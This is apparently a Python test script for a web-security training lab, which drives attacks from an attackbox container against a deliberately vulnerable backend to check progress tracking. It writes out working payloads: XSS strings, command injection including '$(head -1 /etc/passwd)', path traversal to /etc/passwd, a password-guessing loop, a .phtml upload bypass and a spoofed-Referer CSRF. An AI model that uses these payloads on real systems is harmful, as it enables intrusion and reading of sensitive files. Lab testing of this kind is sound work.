"""
verify_target_op.py — End-to-end check that the operator-mode HARDER
backend at /op/* works for every module, AND that operator-mode progress
climbs to 100% via AttackBox traffic only.

Runs against the live Docker stack (no in-process mocks). For each
module it:
  1. Resets the target-agent evidence store.
  2. Drives the operator ladder by issuing curl-equivalent requests
     from inside attense-attackbox (so events get tagged via=attackbox).
  3. Polls /api/operator/zap/* once to confirm ZAP is reachable AND
     credits operator progress through the Repeater (UA injection fix).
  4. Calls compute() in the red-team backend (via the lab/events store)
     and asserts operator progress = 100% per module.

Run:
    python scripts/verify_target_op.py
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import time
import urllib.parse
from pathlib import Path

try:
    sys.stdout.reconfigure(encoding="utf-8")  # type: ignore[attr-defined]
except Exception:
    pass

ROOT = Path(__file__).resolve().parent.parent


def _read_operator_users() -> dict[str, str]:
    raw = os.getenv("OPERATOR_AUTH_USERS_JSON") or os.getenv("OPERATOR_AUTH_USERS")
    if not raw:
        env_path = ROOT / "secrets" / "ATTENSE.env"
        if env_path.exists():
            for line in env_path.read_text(encoding="utf-8").splitlines():
                if line.startswith("OPERATOR_AUTH_USERS_JSON="):
                    raw = line.split("=", 1)[1].strip()
                    break
    if not raw:
        file_path = Path(
            os.getenv(
                "OPERATOR_AUTH_USERS_FILE",
                str(ROOT / "secrets" / "operator-auth-users.json"),
            )
        )
        if file_path.exists():
            raw = file_path.read_text(encoding="utf-8")
    if not raw:
        raise RuntimeError("Operator credentials are not configured in env or local secrets")

    data = json.loads(raw)
    if not isinstance(data, dict) or not data:
        raise RuntimeError("Operator credential config must be a non-empty JSON object")
    return {str(user): str(password) for user, password in data.items()}


OPERATOR_USER, OPERATOR_PASSWORD = next(iter(_read_operator_users().items()))
OPERATOR_BODY = urllib.parse.urlencode({
    "username": OPERATOR_USER,
    "password": OPERATOR_PASSWORD,
})


def run(cmd, container="attense-attackbox"):
    """Run a command inside an attache container, return stdout."""
    full = ["docker", "exec", container, "bash", "-c", cmd]
    res = subprocess.run(full, capture_output=True, text=True, timeout=30)
    return res.stdout, res.stderr, res.returncode


def reset_evidence():
    run(
        'curl -sS -X POST http://target-agent/lab/events/reset',
        container="attense_red_team_backend",
    )


def fetch_progress(module_id):
    """Call lab_progress.compute via the backend's check-progress route by
    poking the events directly. We simulate the same compute logic by
    calling /lab/events and replicating the operator-mode filter."""
    out, _, _ = run(
        f'curl -sS "http://target-agent/lab/events?limit=500"',
        container="attense_red_team_backend",
    )
    try:
        events = json.loads(out)["events"]
    except Exception:
        return None
    return events


# Match a subset of lab_progress.PROGRESS_SPECS for verification.
# (Kept in sync with apps/red-team-api/backend/lab_progress.py tasks_operator.)
SPECS = {
    "recon": [
        ("portal_visited",  ["portal_visited"], 1),
        ("areas",           ["route_discovered","search_used","diagnostics_used",
                              "file_viewer_used","file_upload_used","profile_update_used"], 4),
        ("hidden_clue",     ["hidden_clue_accessed","csrf_lure_visited"], 1),
        ("recon_seq",       ["recon_sequence_observed"], 1),
    ],
    "brute_force": [
        ("probe",           ["login_failed","login_success"], 1),
        ("wordlist",        ["login_failed"], 6),
        ("pattern",         ["brute_force_pattern"], 1),
        ("credential",      ["credential_found"], 1),
    ],
    "xss": [
        ("search_used",     ["search_used"], 1),
        ("payloads",        ["xss_payload_observed"], 2),
        ("reflected",       ["reflected_input_detected"], 1),
    ],
    "cmd_injection": [
        ("diag",            ["diagnostics_used"], 1),
        ("seps",             ["command_separator_observed"], 2),
        ("rce",              ["command_injection_detected"], 1),
    ],
    "dir_traversal": [
        ("viewer",          ["file_viewer_used"], 1),
        ("traversals",      ["traversal_pattern_observed"], 2),
        ("disclosure",      ["sensitive_file_disclosed"], 1),
    ],
    "file_upload": [
        ("upload",          ["file_upload_used"], 1),
        ("saved",            ["file_saved"], 2),
        ("dangerous",        ["dangerous_extension_accepted","unrestricted_upload_detected"], 1),
    ],
    "csrf": [
        ("login",           ["login_success"], 1),
        ("profile",         ["profile_update_used"], 1),
        ("forge",            ["csrf_token_missing","profile_changed_without_csrf"], 1),
    ],
}


def operator_progress(module_id, events, started_at):
    spec = SPECS[module_id]
    relevant = [e for e in events
                if e.get("ts", 0) >= started_at and e.get("via") == "attackbox"]
    completed = 0
    for label, types, min_count in spec:
        n = sum(1 for e in relevant if e.get("event_type") in types)
        if n >= min_count:
            completed += 1
    return int(round(100 * completed / len(spec))), completed, len(spec)


# ── Per-module driver scripts run inside the attackbox container ───────────
def drive_recon():
    cmds = [
        # Step 1: portal — fires portal_visited
        'curl -sS -o /dev/null http://target-agent/op/',
        # Step 2 (areas) — visit 4 distinct route types
        'curl -sS -o /dev/null "http://target-agent/op/search?q=test"',
        'curl -sS -o /dev/null "http://target-agent/op/system/ping?host=127.0.0.1"',
        'curl -sS -o /dev/null "http://target-agent/op/files/read?path=readme.txt"',
        'curl -sS -o /dev/null http://target-agent/op/profile/',
        # Step 3 (hidden clue at /.git/config)
        'curl -sS -o /dev/null http://target-agent/op/.git/config',
    ]
    for c in cmds:
        run(c)


def drive_brute_force():
    # 6 fails (rockyou-style guesses against harder backend)
    for pw in ["admin","password","letmein","123456","qwerty","welcome"]:
        run(f'curl -sS -o /dev/null -X POST -d "username=admin&password={pw}" '
            'http://target-agent/op/auth/login')
    # 1 success on the harder backend
    run(f'curl -sS -o /dev/null -X POST -d "{OPERATOR_BODY}" '
        'http://target-agent/op/auth/login')


def drive_xss():
    # Step 1: baseline search
    run('curl -sS -o /dev/null "http://target-agent/op/search?q=hello"')
    # Step 2: 2 distinct payloads. Sanitizer strips <script>, but xss_payload_observed
    # is credited from the RAW input — so <script>... still earns credit. Plus an
    # event-handler payload that ALSO causes reflected_input_detected.
    run('curl -sS -o /dev/null -G --data-urlencode '
        '"q=<script>alert(1)</script>" http://target-agent/op/search')
    run('curl -sS -o /dev/null -G --data-urlencode '
        '"q=<img src=x onerror=alert(2)>" http://target-agent/op/search')


def drive_cmd_injection():
    # Step 1
    run('curl -sS -o /dev/null "http://target-agent/op/system/ping?host=127.0.0.1"')
    # Step 2: 2 separator attempts (filtered ;|, but credit fires from raw)
    run('curl -sS -o /dev/null -G --data-urlencode '
        '"host=127.0.0.1;id" http://target-agent/op/system/ping')
    run('curl -sS -o /dev/null -G --data-urlencode '
        '"host=127.0.0.1|whoami" http://target-agent/op/system/ping')
    # Step 3: bypass with $() — concat passwd entry into the ping host arg.
    # Ping's "Name or service not known" message echoes the bad host, so
    # the output ends up containing "root:" and "/bin/" → matches markers.
    # Use single-quoted bash arg so $() is preserved literally and only the
    # SERVER-side popen evaluates it.
    run("""curl -sS -o /dev/null -G --data-urlencode 'host=127.0.0.1$(head -1 /etc/passwd)' http://target-agent/op/system/ping""")


def drive_dir_traversal():
    # Step 1
    run('curl -sS -o /dev/null "http://target-agent/op/files/read?path=readme.txt"')
    # Step 2: 2 traversal attempts (.. rejected but credited from raw)
    run('curl -sS -o /dev/null -G --data-urlencode '
        '"path=../../etc/passwd" http://target-agent/op/files/read')
    run('curl -sS -o /dev/null -G --data-urlencode '
        '"path=../etc/passwd" http://target-agent/op/files/read')
    # Step 3: bypass with absolute path → sensitive_file_disclosed
    run('curl -sS -o /dev/null -G --data-urlencode '
        '"path=/etc/passwd" http://target-agent/op/files/read')


def drive_file_upload():
    # Step 1+2: upload 2 benign files (file_upload_used + 2x file_saved)
    run("echo 'hello' > /tmp/a.txt && curl -sS -o /dev/null "
        "-F 'file=@/tmp/a.txt' http://target-agent/op/files/upload")
    run("echo 'world' > /tmp/b.txt && curl -sS -o /dev/null "
        "-F 'file=@/tmp/b.txt' http://target-agent/op/files/upload")
    # Step 3: bypass with .phtml (dangerous_extension_accepted)
    run('echo "<?php ?>" > /tmp/s.phtml && curl -sS -o /dev/null '
        '-F "file=@/tmp/s.phtml" http://target-agent/op/files/upload')


def drive_csrf():
    # Step 1: login (login_success)
    run('curl -sS -c /tmp/c.txt -o /dev/null -X POST '
        f'-d "{OPERATOR_BODY}" '
        'http://target-agent/op/auth/login')
    # Step 2: visit /op/profile/ does NOT fire profile_update_used. We need an
    # actual update. Use the spoofed-Referer bypass on POST /op/profile/update —
    # profile_update_used + csrf_token_missing fire here.
    run('curl -sS -b /tmp/c.txt -o /dev/null -X POST '
        '-H "Referer: http://target-agent/profile/" '
        '-d "email=admin@lab.local" '
        'http://target-agent/op/profile/update')
    # Step 3: change to a different email → profile_changed_without_csrf
    run('curl -sS -b /tmp/c.txt -o /dev/null -X POST '
        '-H "Referer: http://target-agent/profile/" '
        '-d "email=pwned@evil.lab" '
        'http://target-agent/op/profile/update')


DRIVERS = {
    "recon":         drive_recon,
    "brute_force":   drive_brute_force,
    "xss":           drive_xss,
    "cmd_injection": drive_cmd_injection,
    "dir_traversal": drive_dir_traversal,
    "file_upload":   drive_file_upload,
    "csrf":          drive_csrf,
}


def main():
    print("ATTENSE — operator-mode /op backend verification (live Docker)")
    failures = []

    # ── ZAP pre-flight: confirm Repeater traffic now credits operator progress
    print("\n=== ZAP pre-flight ===")
    reset_evidence()
    started = time.time() - 1.0
    payload = json.dumps({
        "method": "POST",
        "path": "/op/auth/login",
        "body": OPERATOR_BODY,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    })
    out, err, _ = run(
        f"curl -sS -X POST -H 'Content-Type: application/json' "
        f"-d '{payload}' http://localhost:8000/api/operator/zap/repeater/send",
        container="attense_red_team_backend",
    )
    print(f"  ZAP repeater response: {out[:80]}...")
    time.sleep(0.5)
    events = fetch_progress("brute_force")
    via_counts = {}
    for e in events or []:
        if e.get("ts", 0) >= started:
            via_counts[e.get("via")] = via_counts.get(e.get("via"), 0) + 1
    print(f"  via= distribution after ZAP repeater: {via_counts}")
    if (via_counts.get("attackbox", 0) < 1):
        failures.append("ZAP Repeater traffic NOT tagged via=attackbox")
    else:
        print("  ✓ ZAP Repeater traffic tagged via=attackbox (credits operator)")

    # ── Per-module driver
    for module_id, drive in DRIVERS.items():
        print(f"\n=== Module: {module_id} ===")
        reset_evidence()
        started = time.time() - 1.0
        drive()
        time.sleep(0.4)
        events = fetch_progress(module_id) or []
        pct, done, total = operator_progress(module_id, events, started)
        relevant_via = {e.get("via") for e in events if e.get("ts", 0) >= started}
        print(f"  via= seen: {sorted(relevant_via)}")
        print(f"  operator progress: {pct}%   ({done}/{total} tasks)")
        for label, types, n in SPECS[module_id]:
            count = sum(1 for e in events
                        if e.get("ts", 0) >= started and e.get("via") == "attackbox"
                        and e.get("event_type") in types)
            mark = "OK" if count >= n else "  "
            print(f"      [{mark}] {label:<14}  matched={count}/{n}  ({','.join(types)})")
        if pct != 100:
            failures.append(f"{module_id}: operator progress {pct}% (expected 100%)")

    print("\n=== Summary ===")
    if failures:
        print(f"RESULT: FAIL ({len(failures)} issue(s))")
        for f in failures:
            print(f"  X {f}")
        sys.exit(1)
    print("RESULT: PASS — all 7 modules reach 100% operator progress on /op,")
    print("              and ZAP Repeater traffic credits operator-mode events.")


if __name__ == "__main__":
    main()
